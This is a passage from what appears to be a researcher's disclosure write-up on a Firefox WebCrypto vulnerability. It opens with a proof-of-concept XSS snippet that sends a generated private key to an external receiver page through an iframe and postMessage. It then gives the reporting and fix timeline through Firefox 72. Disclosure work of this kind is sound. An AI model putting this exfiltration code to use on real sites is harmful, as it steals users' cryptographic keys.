<span><b>&nbsp;&nbsp;&nbsp; //XSS starts here<br>&nbsp;&nbsp;&nbsp; //exfiltrate the privateKey through postMessage<br>&nbsp;&nbsp;&nbsp; //the attacker receiver domanin can of course be different</b><br>&nbsp;&nbsp;&nbsp; var ifr = document.createElement("iframe")<br>&nbsp;&nbsp;&nbsp; ifr.src = "https://asanso.github.io/firefox/receiver.html"<br>&nbsp;&nbsp;&nbsp; ifr.id = "frm";<br>&nbsp;&nbsp;&nbsp; document.body.appendChild(ifr);<br>&nbsp;&nbsp;&nbsp; var frm = document.getElementById('frm').contentWindow;<br>&nbsp;&nbsp;&nbsp; frm.postMessage(kpE.privateKey,"https://asanso.github.io/firefox/receiver.html");</span></p>


<p><b>27-06-2018 - </b>Reported the issue via bugzilla: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1471684">Bug 1471684</a><br>
<b><b>28-06-2018 </b>- </b>Firefox security team confirmed the vulnerability (setting impact to <b>Moderate</b>)<br>
<b>28-03-2019 -</b> <span><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1539578">Bug 1539578</a>: <i>Add telemetry for DH use in WebCrypto API</i> was created</span><br>
<b>28-10-2019 -</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1564509">Bug 1564509</a>: <i>Remove support for DH from WebCrypto API (not in spec)</i> was created<br>
<b>07-01-2020 - </b>Firefox 72 containing the fix was released<br>
<b></b></p><h2>
<span> Acknowledgement</span></h2>
</div>
<p>
I would like to thank <a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a> and all the Firefox Security team, as usual you rock!</p>
<h2>
That's all folks! For more Crypto stuff <a href="https://twitter.com/asanso">follow me on Twitter</a>.</h2>


</div>

</div></div></div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
    </footer>
    
    <script>
        _dna = window._dna || {};
        _dna.siteId = "linksfor.devs";
        _dna.outlink = true;

        (function () {
            let dna = document.createElement('script');
            dna.type = 'text/javascript';
            dna.async = true;
            dna.src = '//dna.buildstarted.com/t.js';
            let s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(dna, s);
        })();
    </script>

</body>
</html>